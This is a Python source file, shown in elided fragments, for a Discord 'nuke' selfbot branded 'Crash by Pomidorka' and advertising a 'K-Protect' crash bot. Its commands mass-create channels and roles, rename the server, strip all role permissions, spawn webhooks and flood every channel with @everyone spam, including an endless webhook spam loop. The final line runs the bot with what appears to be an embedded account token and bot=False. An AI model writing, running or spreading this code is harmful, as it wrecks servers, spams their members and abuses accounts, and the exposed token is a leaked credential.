...
large_image_id=1079758068667121674
...
async def on_ready():
	await client.change_presence(
		activity = discord.Activity(
			...
			name = "В сети 24/7. Игнор? Дублируй!",
			assets = {
			  'large_image' : str(large_image_id),
			  'large_text':'В сети 24/7. Игнор? Дублируй!'
			},
...
bloodspam = '|| @everyone @here || защитите сервер уже бл крутым краш ботом K-Protect <:KPkptotect:1025726534050394152> https://discord.gg/k-protect'
...
async def createchannel(ctx):
    try:
        c = await ctx.guild.create_text_channel(f'crash-by-pomidorka-{random.randint(1, 1000)}')
    except:
        pass
    else:
        pass
...
async def createrole(ctx):
    try:
        await ctx.guild.create_role(name=f'Crash by Pomidorka & K-Protect {random.randint(1, 1000)}',color = 0xff0000)
    except:
        pass
...
async def chanspam(ctx):
    for channel in ctx.guild.text_channels:
        create_task(sendch(ctx,ch=channel,text='|| @everyone @here || защитите сервер уже бл крутым краш ботом K-Protect <:KPkptotect:1025726534050394152> https://discord.gg/k-protect',count=1))
    ...
    for channel in ctx.guild.text_channels:
        if member.permissions_in(channel).manage_webhooks:
            ...
            if len(webhoks) > 0:
                ...
                webhook = await channel.create_webhook(name="Crash by Pomidorka")
                whlist.append(webhook)
        else:
...
|| @everyone @here || защитите сервер уже бл крутым краш ботом K-Protect <:KPkptotect:1025726534050394152> https://discord.gg/k-protect
''', username = "Nuke by Pomidorka")
            except: pass
...
@client.command()
async def spamv2(ctx, num=10, *, text='|| @everyone @here || защитите сервер уже бл крутым краш ботом K-Protect <:KPkptotect:1025726534050394152> https://discord.gg/k-protect'):
	if num == 0 or text in ['']:
...
async def sendhook(ctx, channelm):
		for i in range(100):
			...
			for hook in hooks:
				await hook.send('|| @everyone @here || защитите сервер уже бл крутым краш ботом K-Protect <:KPkptotect:1025726534050394152> https://discord.gg/k-protect')

@client.command()
async def spamallchannels(ctx):
	await ctx.message.delete()
	for i in range(6):
		text = f'{randint(0,999)}|| @everyone @here || защитите сервер уже бл крутым краш ботом K-Protect <:KPkptotect:1025726534050394152> https://discord.gg/k-protect'
		await ctx.send(text)
	...
	try:
			for c in ctx.guild.text_channels:
				...
				for hook in hooks:
					await hook.send(f'{randint(0,999)}|| @everyone @here || защитите сервер уже бл крутым краш ботом K-Protect <:KPkptotect:1025726534050394152> https://discord.gg/k-protect')
	except Exception as e:
			print(e)

	for c in ctx.guild.text_channels:
		try:
			await c.send(f'{randint(0,999)}|| @everyone @here || защитите сервер уже бл крутым краш ботом K-Protect <:KPkptotect:1025726534050394152> https://discord.gg/k-protect')
		except:
			pass
...
#		try:
	...
	await ctx.guild.create_category(name=name, reason="f")
#		except: pass
	while(30):
		try:
			name = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=8))
...
async def auto(ctx):
  ...
  for x in ctx.guild.channels:
    ...
    await guild.edit(name='Crashed By Pomidorka')
  ...
  for _ in range(50):
    await ctx.guild.create_text_channel(name=f"crash-by-pomidorka-{random.randint(1, 1000)}")
  for _ in range(50):
    await ctx.guild.create_role(name =f"crash-by-pomidorka-{random.randint(1, 1000)}", color = 0xff0000)
...
async def antilavan(ctx):
    for role in ctx.guild.roles:
        try:
            await role.edit(name="Crash by Pomidorka", permissions=discord.Permissions(permissions=0))
        except:
            pass
        else:
            pass
    ...
    for channel in ctx.guild.channels:
        try:
            await channel.edit(name=f"crash-by-pomidorka-{random.randint(1, 1000)}", topic="{randint(0,999)}|| @everyone @here || защитите сервер уже бл крутым краш ботом K-Protect <:KPkptotect:1025726534050394152> https://discord.gg/k-protect")
        except:
            pass
        else:
            pass
    ...
    for chan in ctx.guild.text_channels:
        try:
            hell = await chan.create_webhook(name='Crashed by Pomidorka')
        except:
            pass
...
async def crash(ctx):
    ...
    async def crc_task(guild):
        ...
        async def create(name, topic):
            try:
                channel = await guild.create_text_channel(name=f"crash-by-pomidorka-{random.randint(1, 1000)}", topic=topic)
            except Exception as e:
                pass
            else:
                pass 
        await asyncio.gather(*[create(name=f"crash-by-pomidorka-{random.randint(1, 1000)}", topic=channelsTopic) for _ in range(50)])
...
async def rnc(ctx):
    ...
    async def delc_task(guild):
        ...
        async def delete(channel):
            try:
                await channel.edit(name=f"crash-by-pomidorka-{random.randint(1, 1000)}", topic=channelsTopic)
            except:
                try:
                    await channel.edit(name=f"crash-by-pomidorka-{random.randint(1, 1000)}", topic=channelsTopic)
                except:
...
async def on_guild_channel_create(channel):
    if isinstance(channel, discord.TextChannel):
        if channel.name == 'crash-by-pomidorka' or channel.name == 'crashed-by-pomidorka-great':
            webhook = await channel.create_webhook(name = "Nuked By Pomidorka")
            ...
            async with aiohttp.ClientSession() as session:
                ...
                while True:
                    try:
                        await webhook.send('''|| @everyone @here || защитите сервер уже бл крутым краш ботом K-Protect <:KPkptotect:1025726534050394152> https://discord.gg/k-protect
''')
                    except:
                        return
...
async def hookall(ctx, numb: typing.Optional[int] = 30, *, text='''{randint(0,999)}|| @everyone @here || защитите сервер уже бл крутым краш ботом K-Protect <:KPkptotect:1025726534050394152> https://discord.gg/k-protect
'''):
...
async def createhook(channel):
    ...
    if len(hooks) == 0:
        webh = await channel.create_webhook(name='Crash by Pomidorka')
        return webh
    else:
...
async def ename(ctx, guild):
    with open('austr.jpg', 'rb') as f:
        icon = f.read()
    try:
        await ctx.guild.edit(name = "Crash by Pomidorka", icon = icon)
    except:
        pass

@client.command()
async def rename(ctx, *, name = "Crash by Pomidorka"):
    await ctx.message.delete()
    with open('austr.jpg', 'rb') as f:
        icon = f.read()
    try:
...
async def channels(ctx, name, numb: typing.Optional[int] = 30):
  for _ in range(numb):
    try:
      await ctx.guild.create_text_channel(name=name, topic="|| @everyone @here || защитите сервер уже бл крутым краш ботом K-Protect <:KPkptotect:1025726534050394152> https://discord.gg/k-protect")
    except: pass
...
client.run('MTAxNzAxOTIxNDQ2NjM5NjE3MQ.G8gesg.cf5E4tTek8h4MIP6Umb3X__rrsrrIVKfKQ-U58', bot=False)
